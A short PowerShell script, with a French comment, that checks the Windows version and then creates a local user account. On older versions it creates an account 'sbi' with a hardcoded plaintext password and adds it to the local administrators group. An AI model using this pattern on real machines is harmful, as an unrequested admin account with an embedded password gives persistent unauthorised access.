#Test de la version de Windows
$version= (Get-WmiObject Win32_OperatingSystem).Version
$length= $version.Length
$index= $version.IndexOf(".")
[int]$windows= $version.Remove($index,$length-2)  

IF ($windows -eq 10) {
New-LocalUser -Name $param1 -Description "Son of Goku" -Password $param2
exit 1
} ELSE {
cmd.exe /c net user sbi #Sbi84000# /add
cmd.exe /c net user sbi /active:yes
cmd.exe /c net localgroup administrateurs sbi /add
exit 1
}
